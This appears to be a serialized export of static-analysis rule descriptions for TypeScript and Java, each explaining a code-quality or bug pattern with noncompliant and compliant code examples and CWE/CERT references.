typescriptS26813Multiline blocks should be enclosed in curly braces"MAJOR*ts:ê<p>Curly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be
misleading and induce bugs.</p>
<p>This rule raises an issue when the whitespacing of the lines after a one line block indicates an intent to include those lines in the block, but
the omission of curly braces means the lines will be unconditionally executed once.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)
  firstActionInBlock();
  secondAction();  // Noncompliant; executed unconditionally
thirdAction();

if (condition) firstActionInBlock(); secondAction();  // Noncompliant; secondAction executed unconditionally

if (condition) firstActionInBlock();  // Noncompliant
  secondAction();  // Executed unconditionally

if (condition); secondAction();  // Noncompliant; secondAction executed unconditionally

let str = undefined;
for (let i = 0; i &lt; array.length; i++)
  str = array[i];
  doTheThing(str);  // Noncompliant; executed only on last array element
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  firstActionInBlock();
  secondAction();
}
thirdAction();

let str = undefined;
for (let i = 0; i &lt; array.length; i++) {
  str = array[i];
  doTheThing(str);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/483.html">MITRE, CWE-483</a> - Incorrect Block Delimitation </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/3wHEAw">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>Z
CODE_SMELL
†
typescript:S1117ã

typescriptS1117 Variables should not be shadowed"MAJOR*ts:º<p>Overriding or shadowing a variable declared in an outer scope can strongly impact the readability, and therefore the maintainability, of a piece of
code. Further, it could lead maintainers to introduce bugs because they think they're using one variable but are really using another.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/DCL01-C.+Do+not+reuse+variable+names+in+subscopes">CERT, DCL01-C.</a> - Do not reuse
  variable names in subscopes </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/DCL51-J.+Do+not+shadow+or+obscure+identifiers+in+subscopes">CERT, DCL51-J.</a> - Do
  not shadow or obscure identifiers in subscopes </li>
</ul>Z
CODE_SMELL
π
typescript:S1479§

typescriptS1479;"switch" statements should not have too many "case" clauses"MAJOR*ts:∫<p>When <code>switch</code> statements have large sets of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map
structure would be more readable and maintainable, and should be used instead.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>Z
CODE_SMELL
∂
typescript:S1764°

typescriptS1764KIdentical expressions should not be used on both sides of a binary operator"MAJOR*ts:Æ<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (a == b &amp;&amp; a == b) { // if the first one is true, the second one is too
  doX();
}
if (a &gt; a) { // always false
  doW();
}

var j = 5 / 5; //always 1
var k = 5 - 5; //always 0
</pre>
<h2>Exceptions</h2>
<p>The specific case of testing one variable against itself is a valid test for <code>NaN</code> and is therefore ignored.</p>
<p>Similarly, left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored. </p>
<p>Moreover comma operator <code>,</code> and <code>instanceof</code> operator are ignored as there are use-cases when there usage is valid.</p>
<pre>
if (f !== f) { // test for NaN value
  console.log("f is NaN");
}

var i = 1 &lt;&lt; 1; // Compliant
var j = a &lt;&lt; a; // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=javascript%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>ZBUG
Ú
typescript:S3786›

typescriptS3786ITemplate literal placeholder syntax should not be used in regular strings"MAJOR*ts:Ï<p>Template strings allow developers to embed variables or expressions in strings using template literals, instead of string concatenation. This is
done by using expressions like <code>${variable} </code> in a string between two back-ticks (<code>`</code>). However, when used in a regular string
literal (between double or single quotes) the template will not be evaluated and will be used as a literal, which is probably not what was
intended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
console.log("Today is ${date}"); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
console.log(`Today is ${date}`);
</pre>ZBUG
ª
typescript:S1121¶

typescriptS1121:Assignments should not be made from within sub-expressions"MAJOR*ts:Ω<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ((str = cont.substring(pos1, pos2)) != '') { // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
str = cont.substring(pos1, pos2);
if (str != '') {
  //...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/481.html">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/nYFtAg">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/1gCTAw">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
</ul>Z
CODE_SMELL
ô
typescript:S4634Ñ

typescriptS4634!Shorthand promises should be used"MAJOR*ts:¥<p> When a <code>Promise</code> needs to only "resolve" or "reject", it's more efficient and readable to use the methods specially created for such
use cases: <code>Promise.resolve(value)</code> and <code>Promise.reject(error)</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let fulfilledPromise = new Promise(resolve =&gt; resolve(42));
let rejectedPromise = new Promise(function(resolve, reject) {
  reject('fail');
});
</pre>
<h2>Compliant Solution</h2>
<pre>
let fulfilledPromise = Promise.resolve(42);
let rejectedPromise = Promise.reject('fail');
</pre>Z
CODE_SMELL
˘
typescript:S4204‰

typescriptS4204!The "any" type should not be used"MAJOR*ts:î<p>Variables can be declared with or without types. Variables declared without a type will be implicitly typed if the declaration includes an
initialization, and compiler type checking will be automatically applied to any typed variable. But if you declare a variable with the
<code>any</code> "type" then you've explicitly told the compiler not to do any type checking, which is risky. </p>
<h2>Noncompliant Code Example</h2>
<pre>
let a = 42;  // implicitly typed to number
let b: number = 42;  // explicitly typed to number
let c: any = 42;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
let a = 42;
let b: number = 42;
let c: number = 42;
</pre>Z
CODE_SMELL
Ø
typescript:S4327ö

typescriptS4327*"this" should not be assigned to variables"MAJOR*ts:¡<p>Assigning <code>this</code> to a local variable is a way to reference parent context inside inner functions. In TypeScript when using arrow
functions this happens automatically.</p>
<p>This rule raises an issue when <code>this</code> is assigned to a local variable.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function Foo() {
  let that = this;  // Noncompliant
  that.val = 0;

  setInterval(function() {
    that.val++;
  }, 1000);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function Foo() {
  this.val = 0;

  setInterval(() =&gt; {
    this.val++;
  }, 1000);
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores <code>this</code> used for destructuring.</p>
<pre>
const { foo, bar } = this;
</pre>Z
CODE_SMELL
´
typescript:S4328ñ

typescriptS4328Dependencies should be explicit"MAJOR*ts:»<p>Dependencies should be explicitly listed in the <code>package.json</code> file. Importing a module that is not declared as a dependency makes it an
implicit one and is bound to create problems.</p>Z
CODE_SMELL
≈
typescript:S1854∞

typescriptS1854$Unused assignments should be removed"MAJOR*ts:›<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value
only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.
Therefore all calculated values should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
i = a + b; // Noncompliant; calculation result not used before value is overwritten
i = compute();
</pre>
<h2>Compliant Solution</h2>
<pre>
i = a + b;
i += compute();
</pre>
<h2>Exceptions</h2>
<p>This rule ignores initializations to -1, 0, 1, <code>null</code>, <code>undefined</code>, [], {}, <code>true</code>, <code>false</code> and
<code>""</code>. Variables that start with an underscore (e.g. '<code>_unused</code>') are ignored.</p>
<p>This rule also ignores variables declared with object destructuring using rest syntax (used to exclude some properties from object):</p>
<pre>
let {a, b, ...rest} = obj; // 'a' and 'b' are ok
doSomething(rest);

let [x1, x2, x3] = arr;    // but 'x1' is noncompliant, as omitting syntax can be used: "let [, x2, x3] = arr;"
doSomething(x2, x3);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/563.html">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/QYA5">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/uQCSBg">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>Z
CODE_SMELL
®
typescript:S4043ì

typescriptS40436Array-mutating methods should not be used misleadingly"MAJOR*ts:µ<p>Many of JavaScript's <code>Array</code> methods return an altered version of the array while leaving the source array intact. <code>reverse</code>
and <code>sort</code> do not fall into this category. Instead, they alter the source array <em>in addition to</em> returning the altered version,
which is likely not what was intended.</p>
<p>This rule raises an issue when the return values of these methods are assigned, which could lead maintainers to overlook the fact that the original
value is altered.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var b = a.reverse(); // Noncompliant
var d = c.sort(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var b = [...a].reverse();  // de-structure and create a new array, so reverse doesn't impact 'a'
a.reverse();

c.sort(); // this sorts array in place
</pre>ZBUG
å
typescript:S1066˜

typescriptS1066,Collapsible "if" statements should be merged"MAJOR*ts:ú<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x != undefined) {
  if (y === 2) {
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x != undefined &amp;&amp; y === 2) {
  // ...
}
</pre>Z
CODE_SMELL
	
typescript:S1862€	

typescriptS1862BRelated "if/else if" statements should not have the same condition"MAJOR*ts:Ò<p>A chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first
one with a condition that evaluates to <code>true</code>.</p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and
at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior.</p>
<p>&nbsp;</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 1)  // Noncompliant
  moveWindowToTheBackground();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 3)
  moveWindowToTheBackground();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
ƒ	
typescript:S3923Ø	

typescriptS3923WAll branches in a conditional structure should not have exactly the same implementation"MAJOR*ts:∞<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>switch</code>/<code>if</code> chain at all.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (b == 0) {  // Noncompliant
  doOneMoreThing();
}
else {
  doOneMoreThing();
}

let a = (b == 0) ? getValue() : getValue();   // Noncompliant

switch (i) {  // Noncompliant
  case 1:
    doSomething();
    break;
  case 2:
    doSomething();
    break;
  case 3:
    doSomething();
    break;
  default:
    doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code>
clauses.</p>
<pre>
if(b == 0) {    //no issue, this could have been done on purpose to make the code more readable
  doSomething();
} else if(b == 1) {
  doSomething();
}
</pre>ZBUG
≈
typescript:S3699∞

typescriptS3699EThe output of functions that don't return anything should not be used"MAJOR*ts:√<p>If a function does not return anything, it makes no sense to use its output. Specifically, passing it to another function, or assigning its
"result" to a variable is probably a bug because such functions return <code>undefined</code>, which is probably not what was intended.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo() {
  console.log("Hello, World!");
}

a = foo();
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo() {
  console.log("Hello, World!");
}

foo();
</pre>ZBUG
Ô
typescript:S3801⁄

typescriptS3801*Functions should use "return" consistently"MAJOR*ts:Å<p>Unlike strongly typed languages, JavaScript does not enforce a return type on a function. This means that different paths through a function can
return different types of values, which can be very confusing to the user and significantly harder to maintain.</p>
<p>In particular a function, in JavaScript, will return <code>undefined</code> in any of the following cases:</p>
<ul>
  <li> It exits without a <code>return</code> statement. </li>
  <li> It executes a <code>return</code> with no value. </li>
</ul>
<p>This rule verifies that return values are either always or never specified for each path through a function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo(a) { // Noncompliant, function exits without "return"
  if (a == 1) {
    return true;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo(a) {
  if (a == 1) {
    return true;
  }
  return false;
}
</pre>Z
CODE_SMELL
Ÿ	
typescript:S4822ƒ	

typescriptS48226Promise rejections should not be caught by 'try' block"MAJOR*ts:Ê<p>An exception (including <code>reject</code>) thrown by a promise will not be caught be a nesting <code>try</code> block, due to the asynchronous
nature of execution. Instead, use <code>catch</code> method of <code>Promise</code> or wrap it inside <code>await</code> expression.</p>
<p>Rule reports <code>try-catch</code> statements containing nothing else but call(s) to a function returning <code>Promise</code> (thus it's less
likely that <code>catch</code> is intended to catch something else than <code>Promise</code> rejection).</p>
<h2>Noncompliant Code Example</h2>
<pre>
function runPromise() {
  return Promise.reject("rejection reason");
}

function foo() {
  try { // Noncompliant, the catch clause of the 'try' will not be executed for the code inside promise
    runPromise();
  } catch (e) {
    console.log("Failed to run promise", e);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo() {
  runPromise().catch(e =&gt; console.log("Failed to run promise", e));
}

// or
async function foo() {
  try {
    await runPromise();
  } catch (e) {
    console.log("Failed to run promise", e);
  }
}
</pre>ZBUG
Î
typescript:S2123÷

typescriptS2123*Values should not be uselessly incremented"MAJOR*ts:Ñ<p>A value that is incremented or decremented and then not stored is at best wasted code and at worst a bug.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function pickNumber() {
  let i = 0;
  i = i++; // Noncompliant; i is still zero

  return i++; // Noncompliant; 0 returned
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function pickNumber() {
  let i = 0;
  i++;

  return ++i;
}
</pre>ZBUG
Û
typescript:S3696ﬁ

typescriptS3696Literals should not be thrown"MAJOR*ts:í<p>It is a bad practice to <code>throw</code> something that's not derived at some level from <code>Error</code>. If you can't find an existing
<code>Error</code> type that suitably conveys what you need to convey, then you should extend <code>Error</code> to create one.</p>
<p>Specifically, part of the point of throwing \<code>Error</code>s is to communicate about the conditions of the error, but literals have far less
ability to communicate meaningfully than \<code>Error</code>s because they don't include stacktraces.</p>
<h2>Noncompliant Code Example</h2>
<pre>
throw 404;                              // Noncompliant
throw "Invalid negative index.";        // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
throw new Error("Status: " + 404);
throw new Error("Invalid negative index.");{code}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 15-1-2 - NULL shall not be thrown explicitly. </li>
</ul>Z
CODE_SMELL
É
typescript:S4144Ó

typescriptS41443Functions should not have identical implementations"MAJOR*ts:å<p>When two functions have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but
may be confusing to maintainers. In the latter case, the code should be refactored.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
function calculateCode() {
  doTheThing();
  doOtherThing();
  return code;
}

function getName() {  // Noncompliant
  doTheThing();
  doOtherThing();
  return code;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function calculateCode() {
  doTheThing();
  doOtherThing();
  return code;
}

function getName() {
  return calculateCode();
}
</pre>
<h2>Exceptions</h2>
<p>Functions with fewer than 3 lines are ignored.</p>Z
CODE_SMELL
ﬂ
typescript:S4782 

typescriptS4782MOptional property declarations should not use both '?' and 'undefined' syntax"MAJOR*ts:Œ<p>In TypeScript there are several ways to declare a property with <code>undefined</code> value: adding <code>| undefined</code> in the property type
or using optional property syntax (<code>?</code> after its name). Use <code>| undefined</code> syntax when you want to be explicit that an object has
that property, in that case TypeScript compiler will not allow omitting it:</p>
<pre>
interface Person {
  name: string;
  address: string | undefined;
}

let John = { name: "John" }; // will not compile
let John = { name: "John", address: undefined }; // will compile, we want to be explicit when person does not have home
</pre>
<p>Use optional property syntax for properties holding some additional information.</p>
<pre>
interface Person {
  name: string;
  pet?: string;
}

let John = { name: "John" }; // will compile
let John = { name: "John", pet: undefined }; // will compile, there is no pet like for the object on previous line
let John = { name: "John", pet: "Benji" }; // will compile
</pre>
<p>Using <code>| undefined</code> for optional property is redundant, it can be omitted without change to the actual type. Still if you want to force
the property in the object consider using only <code>| undefined</code> without <code>?</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
interface Person {
  name: string;
  address? : string | undefined;   // Noncompliant, "?" should be removed
  pet?: Animal | undefined; // Noncompliant, "undefined" should be removed
}
</pre>
<h2>Compliant Solution</h2>
<pre>
interface Person {
  name: string;
  address: string | undefined;
  pet?: Animal;
}
</pre>Z
CODE_SMELL
Ú
typescript:S1439›

typescriptS1439DOnly "while", "do", "for" and "switch" statements should be labelled"MAJOR*ts:Í<p>Any statement or block of statements can be identified by a label, but those labels should be used only on <code>while</code>,
<code>do-while</code>, <code>for</code> and <code>switch</code> statements. Using labels in any other context leads to unstructured, confusing code.
</p>
<h2>Noncompliant Code Example</h2>
<pre>
myLabel: if (i % 2 == 0) {  // Noncompliant
  if (i == 12) {
    console.log("12");
    break myLabel;
  }
  console.log("Odd number, but not 12");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
myLabel: for (i = 0; i &lt; 10; i++) {   // Compliant
  console.log("Loop");
  break myLabel;
}
</pre>Z
CODE_SMELL
‘	
typescript:S3616ø	

typescriptS3616AComma and logical OR operators should not be used in switch cases"MAJOR*ts:÷<p>The comma operator (<code>,</code>) evaluates its operands, from left to right, and returns the second one. That's useful in some situations, but
just wrong in a <code>switch</code> <code>case</code>. You may think you're compactly handling multiple values in the case, but only the last one in
the comma-list will ever be handled. The rest will fall through to the default.</p>
<p>Similarly the logical OR operator (<code>||</code>) will not work in a <code>switch</code> <code>case</code>, only the first argument will be
considered at execution time.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch a {
  case 1,2:  // Noncompliant; only 2 is ever handled by this case
    doTheThing(a);
  case 3 || 4: // Noncompliant; only '3' is handled
    doThatThing(a);
  case 5:
    doTheOtherThing(a);
  default:
    console.log("Neener, neener!");  // this happens when a==1 or a == 4
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch a {
  case 1:
  case 2:
    doTheThing(a);
  case 3:
  case 4:
    doThatThing(a);
  case 5:
    doTheOtherThing(a);
  default:
    console.log("Neener, neener!");
}
</pre>ZBUG
Æ
typescript:S125ö

typescriptS125,Sections of code should not be commented out"MAJOR*ts:¿<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>Z
CODE_SMELL
∂
typescript:S4140°

typescriptS4140$Sparse arrays should not be declared"MAJOR*ts:Œ<p>An array declared with missing ("sparse") elements is likely to be an error: an extra comma was inserted or perhaps the developer meant to insert
the missing value and forgot.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let a = [1, , 3, 6, 9];  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
let a = [1, 3, 6, 9];
</pre>Z
CODE_SMELL
ü
typescript:S4143ä

typescriptS4143:Collection elements should not be replaced unconditionally"MAJOR*ts:®<p>It is highly suspicious when a value is saved for a key or index and then unconditionally overwritten. Such replacements are likely in error.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
 fruits[1] = "banana";
 fruits[1] = "apple";  // Noncompliant - value on index 1 is overwritten

 myMap.set("key", 1);
 myMap.set("key", 2); // Noncompliant - value for key "key" is replaced

 mySet.add(1);
 mySet.add(1); // Noncompliant - element is already in the set
</pre>ZBUG
Ø
typescript:S3984ö

typescriptS39841Errors should not be created without being thrown"MAJOR*ts:¡<p>Creating a new <code>Error</code> without actually throwing it is useless and is probably due to a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x &lt; 0) {
  new Error("x must be nonnegative");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x &lt; 0) {
  throw new Error("x must be nonnegative");
}
</pre>ZBUG
Ò
typescript:S4798‹

typescriptS47985Optional boolean parameters should have default value"MAJOR*ts:¯<p>Having default value for optional boolean parameters makes the logic of function when missing that parameter more evident. When providing a default
value is not possible, it is better to split the function into two with a clear responsibility separation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function countPositiveNumbers(arr: number[], countZero?: boolean) { // Noncompliant, default value for 'countZero' should be defined
  // ...
}

function toggleProperty(property: string, value?: boolean) { // Noncompliant, a new function should be defined
  if (value !== undefined) {
    setProperty(property, value);
  } else {
    setProperty(property, calculateProperty());
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function countPositiveNumbers(arr: number[], countZero = false) {
  // ...
}

function toggleProperty(property: string, value: boolean) {
  setProperty(property, value);
}

function togglePropertyToCalculatedValue(property: string) {
  setProperty(property, calculateProperty());
}
</pre>Z
CODE_SMELL
 
typescript:S1440µ

typescriptS14407"===" and "!==" should be used instead of "==" and "!=""MAJOR*ts:œ<p>The <code>==</code> and <code>!=</code> operators do type coercion before comparing values. This is bad because it can mask type errors. For
example, it evaluates <code>' \t\r\n' == 0</code> as <code>true</code>.</p>
<p>It is best to always use the side-effect-less <code>===</code> and <code>!==</code> operators instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (var == 'howdy') {...} // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (var === 'howdy') {...}
</pre>
<h2>Exceptions</h2>
<p>Even if testing the equality of a variable against null doesn't do exactly what most JavaScript developers believe, usage of <code>==</code> or
<code>!=</code> is tolerated in such context. In the following case, if <code>foo</code> hasn't been initialized, its default value is not
<code>null</code> but <code>undefined</code>. Nevertheless <code>undefined == null</code>, so JavaScript developers get the expected behavior.</p>
<pre>
if(foo == null) {...}
</pre>Z
CODE_SMELL
Ë
typescript:S3981”

typescriptS3981?Collection sizes and array length comparisons should make sense"MAJOR*ts:Ï<p>The size of a collection and the length of an array are always greater than or equal to zero. So testing that a size or length is greater than or
equal to zero doesn't make sense, since the result is always <code>true</code>. Similarly testing that it is less than zero will always return
<code>false</code>. Perhaps the intent was to check the non-emptiness of the collection or array instead. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if (someSet.size &gt;= 0) {...} // Noncompliant

if (someMap.size &lt; 0) {...} // Noncompliant

const result = someArray.length &gt;= 0;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (someSet.size &gt; 0) {...}

if (someMap.size == 0) {...}

const result = someArray.length &gt; 0;
</pre>ZBUG
Í	
typescript:S2814’	

typescriptS28140Variables and functions should not be redeclared"MAJOR*ts:ˆ<p>This rule checks that a declaration doesn't use a name that is already in use. Indeed, it is possible to use the same symbol multiple times as
either a variable or a function, but doing so is likely to confuse maintainers. Further it's possible that such reassignments are made in error, with
the developer not realizing that the value of the variable is overwritten by the new assignment.</p>
<p>This rule also applies to function parameters.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var a = 'foo';
function a() {}   // Noncompliant
console.log(a);   // prints "foo"

function myFunc(arg) {
  var arg = "event"; // Noncompliant, argument value is lost
}

fun(); // prints "bar"

function fun() {
  console.log("foo");
}

fun(); // prints "bar"

function fun() {  // Noncompliant
  console.log("bar");
}

fun(); // prints "bar"
</pre>
<h2>Compliant Solution</h2>
<pre>
var a = 'foo';
function otherName() {}
console.log(a);

function myFunc(arg) {
  var newName = "event";
}

fun(); // prints "foo"

function fun() {
  print("foo");
}

fun(); // prints "foo"

function printBar() {
  print("bar");
}

printBar(); // prints "bar"
</pre>Z
CODE_SMELL
÷
typescript:S2933¡

typescriptS2933cPrivate properties that are only assigned in the constructor or at declaration should be "readonly""MAJOR*ts:Ø<p><code>readonly</code> properties can only be assigned in a class constructor or at the point of declaration. If a class has a property that's not
marked <code>readonly</code> but is only set in the constructor, it could cause confusion about the property's intended use. To avoid confusion, such
properties should be marked <code>readonly</code> to make their intended use explicit, and to prevent future maintainers from inadvertently changing
their use.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Person {
  private _birthYear: number;  // Noncompliant
  constructor(birthYear: number) {
    this._birthYear = birthYear;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Person {
  private readonly _birthYear: number;
  constructor(birthYear: number) {
    this._birthYear = birthYear;
  }
}
</pre>Z
CODE_SMELL
û
typescript:S138ä

typescriptS1380Functions should not have too many lines of code"MAJOR*ts:¨<p>A function that grows too large tends to aggregate too many responsibilities.</p>
<p>Such functions inevitably become harder to understand and therefore harder to maintain. </p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller functions which focus on well-defined tasks.</p>
<p>Those smaller functions will not only be easier to understand, but also probably easier to test.</p>
<h2>Exceptions</h2>
<p>This function ignores Immediately Invoked Function Expressions (IIFE), which are functions that are created and invoked without ever being assigned
a name.</p>
<pre>
(function () { // Ignored by this rule

  function open() {  // Classic function declaration; not ignored
    // ...
  }

  function read() {
    // ...
  }

  function readlines() {
    // ...
  }
})();
</pre>Z
CODE_SMELL

typescript:S4030€

typescriptS4030,Collection and array contents should be used"MAJOR*ts:Ä<p>When a collection is populated but its contents are never used, then it is surely some kind of mistake. Either refactoring has rendered the
collection moot, or an access is missing.</p>
<p>This rule raises an issue when no methods are called on a collection other than those that add or remove values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function getLength(a, b, c) {
  const strings = [];  // Noncompliant
  strings.push(a);
  strings.push(b);
  strings.push(c);

  return a.length + b.length + c.length;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function getLength(a, b, c) {
  return a.length + b.length + c.length;
}
</pre>Z
CODE_SMELL
‚

java:S1258”
javaS1258@Classes and enums with private members should have a constructor"MAJOR*java:Ë<p>Non-abstract classes and enums with non-<code>static</code>, <code>private</code> members should explicitly initialize those members, either in a
constructor or with a default value.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class A { // Noncompliant
  private int field;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  private int field;

  A(int field) {
    this.field = field;
  }
}
</pre>
<h2>Exceptions</h2>
<p> * Class implementing a Builder Pattern (name ending with "Builder").</p>
<p> * <a href="https://docs.oracle.com/javaee/7/tutorial/index.html">Java EE</a> class annotated with:</p>
<p> <strong></strong> <a href="https://docs.oracle.com/javaee/7/api/javax/annotation/ManagedBean.html">ManagedBean</a></p>
<p> <strong></strong> <a href="https://docs.oracle.com/javaee/7/api/javax/ejb/MessageDriven.html">MessageDriven</a></p>
<p> <strong></strong> <a href="https://docs.oracle.com/javaee/7/api/javax/ejb/Singleton.html">Singleton</a></p>
<p> <strong></strong> <a href="https://docs.oracle.com/javaee/7/api/javax/ejb/Stateful.html">Stateful</a></p>
<p> <strong></strong> <a href="https://docs.oracle.com/javaee/7/api/javax/ejb/Stateless.html">Stateless</a></p>
<p> <strong></strong> <a href="https://docs.oracle.com/javaee/7/api/javax/jws/WebService.html">WebService</a></p>
<p> <strong></strong> <a href="https://docs.oracle.com/javaee/7/api/javax/servlet/annotation/WebFilter.html">WebFilter</a></p>
<p> <strong></strong> <a href="https://docs.oracle.com/javaee/7/api/javax/servlet/annotation/WebServlet.html">WebServlet</a></p>
<p> * Class and field annotated with:</p>
<p> <strong></strong> <a href="https://codehaus-plexus.github.io/plexus-containers/plexus-component-annotations/index.html">Plexus Component
Annotations</a></p>
<p> <strong></strong> <a href="https://maven.apache.org/developers/mojo-api-specification.html">Maven Mojo</a></p>
<p> * Field annotated with:</p>
<p> <strong></strong> <a href="https://docs.oracle.com/javaee/7/api/javax/annotation/Resource.html">Resource</a></p>
<p> <strong></strong> <a href="https://docs.oracle.com/javaee/7/api/javax/ejb/EJB.html">EJB</a></p>
<p> <strong></strong> <a href="https://docs.oracle.com/javaee/7/api/javax/inject/Inject.html">Inject</a></p>
<p> <strong></strong> <a
href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/factory/annotation/Autowired.html">Autowired</a></p>Z
CODE_SMELL
ç

java:S2225˛
javaS22259"toString()" and "clone()" methods should not return null"MAJOR*java:°<p>Calling <code>toString()</code> or <code>clone()</code> on an object should always return a string or an object. Returning <code>null</code>
instead contravenes the method's implicit contract.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String toString () {
  if (this.collection.isEmpty()) {
    return null; // Noncompliant
  } else {
    // ...
</pre>
<h2>Compliant Solution</h2>
<pre>
public String toString () {
  if (this.collection.isEmpty()) {
    return "";
  } else {
    // ...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/476.html">MITRE CWE-476</a> - NULL Pointer Dereference </li>
